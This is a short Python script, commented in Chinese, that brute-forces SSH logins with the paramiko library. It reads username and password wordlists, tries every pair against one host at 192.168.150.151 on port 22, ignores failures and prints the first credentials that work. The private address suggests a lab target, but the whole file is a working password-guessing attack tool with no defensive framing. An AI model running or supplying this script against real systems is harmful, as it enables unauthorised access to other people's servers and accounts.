import paramiko


def blast():
    # 创建一个ssh的客户端，用来连接服务器
    ssh = paramiko.SSHClient()
    # 创建一个ssh的白名单
    know_host = paramiko.AutoAddPolicy()
    # 加载创建的白名单
    ssh.set_missing_host_key_policy(know_host)
    with open('../dict/u&p/username_top300.txt') as u:
        user_list = u.readlines()
    with open('../dict/u&p/password_top500.txt') as p:
        pswd_list = p.readlines()
        for username in user_list:
            for password in pswd_list:
                try:
                    ssh.connect(
                        hostname="192.168.150.151",
                        port=22,
                        username=f"{username.split()[0]}",
                        password=f"{password.split()[0]}"
                    )  # 尝试连接
                    print(f"疑似爆破成功\n用户名：{username.split()[0]}\n密码：{password.split()[0]}")
                    return
                except:
                    pass


if __name__ == '__main__':
    blast()
